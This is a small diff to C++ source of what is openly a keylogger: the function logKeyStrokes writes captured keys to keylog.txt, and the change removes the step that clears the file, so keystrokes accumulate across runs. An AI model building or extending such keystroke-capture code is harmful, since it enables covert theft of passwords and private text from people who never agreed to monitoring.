@@ -12,10 +12,6 @@ void logKeyStrokes(int key){
 
 
     ofstream myFile; // File we are writing to
-
-    myFile.open("keylog.txt", ios::trunc);
-    myFile.close();
-
     myFile.open("keylog.txt", ios::app); // Opens the text file we want to add the information to, and the mode we set it is append so it adds the information after words.
 
 
